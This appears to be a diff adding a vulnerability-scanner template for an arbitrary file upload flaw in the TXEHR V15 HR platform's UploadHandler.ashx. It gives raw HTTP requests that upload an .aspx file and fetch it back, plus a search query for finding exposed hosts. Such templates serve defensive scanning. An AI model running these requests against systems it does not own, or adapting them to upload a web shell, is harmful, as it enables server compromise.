@@ -1,0 +1,51 @@
+id: tosharesoft-Handler-UploadHandler-fileupload
+info:
+  name: 同享人力管理管理平台 UploadHandler.ashx - fileupload
+  author: leadlife
+  severity: critical
+  description: 同享软件成立于1997年，运营中心位于东莞南城南新产业国际。专注研发和推广人力资源信息化产品，帮助企业构建统一的人力资源数智化平台，快速提高企业人才管理能力，提升人力资源管理效率，帮助员工快速成长，协助企业实现智慧决策。同享TXEHR V15人力管理管理平台UploadHandler存在任意文件上传漏洞。
+  reference: 
+    - https://github.com/wy876/POC/blob/d672fb7281b8d68fde4cf142b81405f912fc51e6/%E5%90%8C%E4%BA%AB%E4%BA%BA%E5%8A%9B%E7%AE%A1%E7%90%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0UploadHandler%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="/Assistant/Default.aspx"
+  tags: tosharesoft,fileupload
+
+variables:
+    num: '{{rand_int(800000000, 1000000000)}}'
+
+http:
+  - raw:
+      - |
+        POST /Handler/UploadHandler.ashx?folder=Uploadfile2 HTTP/1.1
+        Host: {{Hostname}}
+        accept: */*
+        Content-Type: multipart/form-data; boundary=---------------------------123
+        Content-Length: 226
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-User: ?1
+        Te: trailers
+        Connection: close
+
+        -----------------------------123
+        Content-Disposition: form-data; name="Filedata"; filename="{{num}}.aspx"
+        Content-Type: text/plain
+
+        {{randstr}}
+        -----------------------------123--
+
+      - |
+        GET /Handler/Uploadfile2/{{num}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
